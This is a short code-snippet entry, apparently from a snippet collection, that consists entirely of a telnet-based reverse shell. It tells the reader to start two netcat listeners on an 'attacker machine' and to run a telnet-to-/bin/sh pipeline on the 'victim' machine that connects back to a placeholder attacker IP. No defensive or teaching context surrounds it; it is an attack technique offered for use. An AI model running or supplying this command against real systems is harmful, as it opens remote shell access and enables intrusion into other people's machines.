---
id: 9a65f4d8-a2e3-4d8c-bfc0-1ca3c12db5dc
type: code
language: Bash
verified: false
created_at: '2023-04-06T03:56:24.592432+00:00'
updated_at: '2023-04-10T20:25:31.632436+00:00'
---

# Code Snippet 9a65f4d8

**Language**: Bash

```bash
In Attacker machine start two listeners:
nc -lvp 8080
nc -lvp 8081

In Victime machine run below command:
telnet <Your_IP> 8080 | /bin/sh | telnet <Your_IP> 8081
```


